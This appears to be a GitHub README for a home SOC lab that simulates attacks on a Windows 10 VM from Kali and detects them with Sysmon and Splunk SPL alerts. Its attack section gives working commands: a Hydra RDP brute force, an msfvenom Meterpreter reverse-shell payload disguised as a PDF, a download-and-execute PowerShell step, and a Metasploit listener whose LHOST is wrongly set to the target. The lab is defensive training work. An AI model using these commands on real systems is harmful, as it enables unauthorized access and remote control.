# 🧑🏻‍💻SIEM-Based-Attack-Detection-Log-Analysis

## Table of Content
1. [Introduction](#introduction)
2. [Tools & Technologies](#tools--technologies)
3. [Architecture Diagram](#architecture-diagram)
4. [Objective](#objective)
5. [Lab-Setup](#lab-setup)
6. [Simulated Attacks](#simulated-attacks)
7. [Splunk Detection](#splunk-detection)
8. [Alerts creation](alerts-creation)
9. [Next Step & Improvements](#next-step--improvements)
10. [Conclusion](#conclusion)

---
## 📘Introduction 
This projects simulates and detects real-world attacks using a SIEM setup involving splunk, sysmon and a windows 10 system attacked by kali linux.This project mostly focused on-
<li>Log Analysis</li>
<li>Detection of suspicious activities</li>
<li>Simulating attacks:
  
   1.Brute Force Login Attempts
   
   2.Privilege Escalation
   
   3.Suspicious Powershell Execution

</li>
This project showcases practical knowledge of SIEM and SOC analyst skils.

---
## 🔧Tools & Technologies
|Tool                  |              Purpose                           |
|----------------------|------------------------------------------------|
|Splunk                |SIEM for log collection, monitoring, and alerts |
|Sysmon                |Detailed system logging on Windows              |
|Kali Linux            |Attacker machine for simulating threats         |
|Metasploit Framework  |For payload generation and malware simulation   |
|Hydra                 |For brute force attack simulation               |
|Windows 10            |Target system                                   |

---
## 🧱Architecture Diagram
```txt
Kali (Attacker)
     |
     |  [Hydra, Metasploit]
     v
Windows 10 (Target)
     |
     |  [Sysmon Logs + WinEvent Logs]
     v
Splunk SIEM (Log Analysis + Alerts)
```

---
## 🎯Objective
<li>Collect and monitor windows security logs with Sysmon</li>
<li>Perform 3 real-world attacks and capture logs</li>
<li>Create splunk alerts to detect these attacks</li>

---
## 🏗Lab Setup


### Step1:Install Kali Linux(Attacker Machine)
<li>Download Kali Linux ISO from <a href="https://www.kali.org/get-kali/#kali-installer-images">official website.</a></li>
<li>Update and Upgrade Kali</li>

```bash
sudo apt update && apt upgrade -y 
```
### Step2: Install Windows 10(Target Machine)
<li>Download windows 10 ISO file from <a href="https://www.microsoft.com/en-in/software-download/windows10">Microsoft</a>.</li>
<li>Ensure networking is enabled for communication Between VMs.</li> 

### Step3:Install Splunk
<li>Download Splunk from <a href="https://www.splunk.com/en_us/download.html">Splunk Website.</a></li>
<li>Install Splunk on windows 10 VMs.</li>
<li>Start Splunk and login with admin credentials</li>
<li>Enable data collection for log monitoring.</li>


> **Note:**
> To send logs to the splunk server, install Splunk Universal Forwarder.

### Step4:Install Sysmon
<li>Install <a href="https://learn.microsoft.com/en-us/sysinternals/downloads/sysmon">Sysmon</a> on Windows 10 VMs.</li>
<li>Download a pre-configured sysmonconfig.xml </li>
<li>Run powershell as Administrator and execute -(change to the directory where sysmon download)</li>

```bash
.\sysmon64.exe -i sysmonconfig.xml
```
<li>Verify Sysmon is running:</li>

```bash
Get-Process sysmon64
```

---
## 🧪Simulated Attacks

> **Note:**
> To perform all these attack simulation , I created an local user "testuser".

 
### 📍Brute Force Attack
This is an hacking attack that uses trial and error to crack passwords and login credentials. For this attack ,I use "Hydra" tool that is an parallelized login cracker which supports numerous protocols to attack. It is very fast and flexible. In this case, the service attacked is Remote Desktop Protocol(RDP). To generate the logs of failed login attempts for SIEM detection.

<b>Set-up Requirements</b>
<li>Windows 10- </li>
1.Enable Remote Desktop (Run:SystemPropertiesRemote.exe).

2.Ensure firewall allow RDP port-3389.

<li>Kali Linux-</li>
1.First, we check rdp port is open or not using nmap.

  ```bash
nmap -p 3389 <Windows_IP>
```
2.Run Hydra-
```bash
hydra -t 4 -V  -f -l Administrator -P /usr/share/wordlists/rockyou.txt rdp://<Windows_ip>
```

### 📍Privilege Escalation
Privilege Escalation consists of techniques that adversaries use to gain higher-level permissions on a system or network. Adversaries can often enter and explore a network with unprivileged access but require elevated permissions to follow through on their objectives. There are many techniques used to get privilege escalation but I use Bypass user account control.

<b>Step1:</b> Login testuser
  If brute force attack is successful ,then we can login into the system using the credentials which we have found during the brute force attack.
  
<b>Step2:</b> Attempt to Escalate privilege
   Once you're inside as "testuser", we can execute the command -
```bash
powershell -Command "Start-Process notepad.exe -Verb runAs"
```
This PowerShell command is used to attempt privilege escalation by launching notepad.exe with administrator rights. Attackers often try to run programs with elevated rights using built-in tools. Even if they fail, the attempt is logged.

### 📍Suspicious PowerShell Execution (Malware Simulation)
In this attack, Simulate malware execution via PowerShell on the Windows 10 target, using a reverse shell payload delivered from the Kali Linux attacker machine.
This mimics what real attackers do after gaining access, and generates logs you can detect in Splunk using Sysmon.

<b>Step1:</b> On kali
In this ,first create an payload :
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=<Kali_IP> LPORT=4444 -f exe -o important.pdf.exe
```
<b>Step2:</b> Host the payload on web server
for this ,we can use many services like apache2,python3. I used python3 because it is easy for testing. we need to first to the directory where payload exist then use python3-
```bash
python3 -m http.server 8000
```
<b>Step3:</b> Set-up Metasploit listener
```bash
msfconsole
```
```bash
use exploit/multi/handler
set payload windows/x64/meterpreter/reverse_tcp
set LHOST <Windows_IP>
set LPORT 4444
run
```

<b>Step4:</b> Download from windows 10(target)
On the target machine (Windows 10), logged in as testuser, open PowerShell and run:
```bash
Invoke-WebRequest  -Uri "http://<kali_IP>:8000/important.pdf.exe" -OutFile "C:\Users\Public\important.pdf.exe"
```
```bash
Start-Process "C:\Users\Public\important.pdf.exe"
```
If this command is successful then Metasploit will receive a reverse shell.
After gaining a Meterpreter session, the attacker executed commands such as sysinfo, getuid, and download to simulate post-exploitation behavior. These activities were logged using Sysmon and analyzed via Splunk to demonstrate real-world detection capabilities.

---
## 🔎Splunk Detection
Now, we are going to analysis logs using splunk. Let's start with brute force attack. for checking this attack, we simply check for the Windows Security wite Event code 4625 which basically show the logs related to failure login attempts. This image shows there are some logs available related to this eventcode.

![image](https://github.com/user-attachments/assets/feeb2497-9930-479b-a4bd-2a4d072427fe)

After appling filter for identify any suspicious IP, I found an outsider IP 
![image](https://github.com/user-attachments/assets/9feab662-1b64-48ba-b8b4-d44eb26c0d78)

This simply shows that from this ip, try to get the access to the system.

Let's move to other simulation attack-privilege escalation.For this I gone through the sysmon with eventcode 1 which basically used to identify for the new process creation like "powershell.exe" or "cmd.exe".
![image](https://github.com/user-attachments/assets/17c39f36-4b02-4ad9-af93-fa55f2b46273)

After analysis the logs deeply, I checked the commandline where some command look suspicious ,there is one command execute to run the notepad as administrator.

![image](https://github.com/user-attachments/assets/14fd3ef6-b422-4260-89b0-e4ceb65f9ca5)

Interesting Point is that ,they try to get administration access through the localuser that makes it more suspicious.

Now, this is the last simulation attack - Malware execution.
For this type of attack, I used the sysmon with some events like 1(process creation),3(NetworkConnection),11(File creation).
![image](https://github.com/user-attachments/assets/232619fd-0b67-4701-8873-5e01fd6ba6ea)

It look suspicious ,I applied filter as 'Message' to know all commands executed by local user.
![image](https://github.com/user-attachments/assets/d2d15053-25da-4919-aef9-9e6dc5defe8d)

For Further going through the messages, I found an command by local user to execute "notepad.exe" ,basically used to open notepad using administration credentials to execute some malicious code.

![image](https://github.com/user-attachments/assets/fb399e5b-3901-474d-b26e-603818ebd613)

Now, lets check the Attacker'IP ,for this I go into the eventcode 3 with same user and image, it used to show the established network connection.

![image](https://github.com/user-attachments/assets/e40ac627-e1b6-48af-9765-69f12a96fe4c)

In Eventcode 3, it shows an outbound connection with an Ip .

![image](https://github.com/user-attachments/assets/f5ce19b3-e6d7-4f4c-b753-6330991123b4)

After finding the IP, I filter it through the DestinationIp and message, it shows connection established with the same ip as we found during brute force attack (Threat actor is  successfull get the localuser access).

![image](https://github.com/user-attachments/assets/aa69a442-b42a-4f41-9c32-3e76185819d2)

Now , I found an Attacker'IP that established connection with the system . let's see there is any executable file create by that unauthorized user or not . For this I gone through the EventCode 11 with same user.

![image](https://github.com/user-attachments/assets/f3aad0be-ec24-4fec-ae80-d377658f353e)
![image](https://github.com/user-attachments/assets/24c1e921-7dad-4edd-8806-a6f3f85df0ba)

After apply filter to see any file create ,but i found one thing strange there is file name "important.pdf.exe". this file shows in many event then we focus on creationtimeutc.when first I query it, it shows zero events but when I go through the nearby time of that creation time, I found an event in which it shows an file executed by the attacker. And it execute through the powershell by localuser means it is an payload to get the access to the system.

![image](https://github.com/user-attachments/assets/4f67db62-b7e3-4b30-b8fb-5b9a83ac033a)
![image](https://github.com/user-attachments/assets/53921176-c54e-476f-a409-0fb9b5c021ea)

---
## 🚨Alerts creation
We can create alert into the splunk using SPL that automatically notify us through the email,webhooks etc. I also create alerts for these attacks and notify me by Email:
<li>Brute Force Alert</li>
Detect more than 5 failed logins (EventCode 4625) from the same IP within 5 minutes.

```bash
index=main EventCode=4625
| stats count by src_ip
| where count > 5
```
<li>Privilege Escalation Attempt Alert</li>
Detect when a privileged token  is used with cmd.exe or powershell.exe.

```bash
index=main EventCode=1 Image="*powershell.exe*"
| stats count by UtcTime,User,Image,CommandLine,ParentImage,ParentCommandLine
```
<li>Suspicious PowerShell Execution (Encoded Payloads)</li>
Detect execution of PowerShell with -EncodedCommand, often used in malware.

```bash
index=sysmon Image="*powershell.exe*" CommandLine="*-EncodedCommand*" 
```

---
## Next Step & Improvements
<li>Set up Kibana/ELK Stack for comparison against Splunk-based detections.</li>
<li>Integrate Python scripts for automating log parsing, threat detection logic, or alert triage.</li>
<li>Implement Wazuh SIEM for better threat detection.</li>

---
## Conclusion

This project proves that even common attack techniques like brute force or PowerShell abuse can be detected and mitigated effectively with the right logging and monitoring tools. It reflects how real-world attackers operate post-exploitation, and shows how SOC analysts can track, detect, and respond using tools like Sysmon and Splunk.

---
## 📌 Notes
<li>Only simulate these attacks in a lab environment.</li>
<li>Do NOT run this on any production or unauthorized systems.</li>
